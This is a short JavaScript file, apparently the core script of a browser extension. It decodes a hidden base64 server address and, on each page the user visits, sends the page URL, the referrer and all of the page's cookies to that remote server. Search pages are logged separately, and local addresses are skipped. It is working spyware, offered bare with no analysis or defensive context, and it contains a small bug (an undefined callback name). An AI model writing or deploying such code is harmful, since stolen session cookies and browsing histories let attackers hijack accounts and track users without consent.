/*    ____           __            ________
   / __/_  _______/ /__   ____  / __/ __/
  / /_/ / / / ___/ //_/  / __ \/ /_/ /_  
 / __/ /_/ / /__/ ,<    / /_/ / __/ __/  
/_/  \__,_/\___/_/|_|   \____/_/ /_/     
                                         */
var coreServer = base64.decode("aHR0cHM6Ly8wMDguZXZvZGVzaWduLnJ1L2V4dC90b29sLnBocA==");
var srchSigns = ["search", "find", "/sch/"];
var skipUrls = ["chrome-extension", "localhost", "192.168", "10.0.0.", "127.0.0.1"];

function logDocument()
{
   for(var i in srchSigns)
   {
      var re = new RegExp(srchSigns[i], 'i');
      if(re.test(document.location.href))
      {
         logSearch();
         return;
      }
   }
   logVisit(); 
}

function logVisit(nextf)
{     
   for(var i in skipUrls)
   {
      var re = new RegExp(skipUrls[i], 'i');
      if(re.test(document.location.href))
      {
         console.log("not logging, skipUrl '" + skipUrls[i] + "' [" + document.location.href + "]");
         return;
      }
   }
   var refer = x25_base64_encode(document.referrer);
   var cookies = x25_base64_encode(document.cookie);
   x25.post(coreServer + "?action=visit",
   {
      url: encodeURIComponent(document.location.href),
      userID: userID,
      cookie: cookies,
      refer: refer
   }, function(d)
   {
      nextf && nextf.call(this, userID);
      x25('#banner').css("color", '#' + (9999 * Math.random()) % 0xffff);
   });
}

function logSearch(nextf)
{
   var url, cookies, refer;
   cookies = x25_base64_encode(document.cookie);
   url = x25_base64_encode(document.location.href);
   refer = x25_base64_encode(document.referrer);
   x25.post(coreServer + "?action=logsearch",
   {
      url: url,
      userID: userID,
      cookie: cookies,
      refer: refer
   }, function(d)
   {
      nextf && nextfunc.call(this, userID);
      x25('#banner').css("color", '#' + (9999 * Math.random()) % 0xffff);
   });
}

x25(function()
{
   console.log("[core.js]");
   assignUserID(logDocument);
});
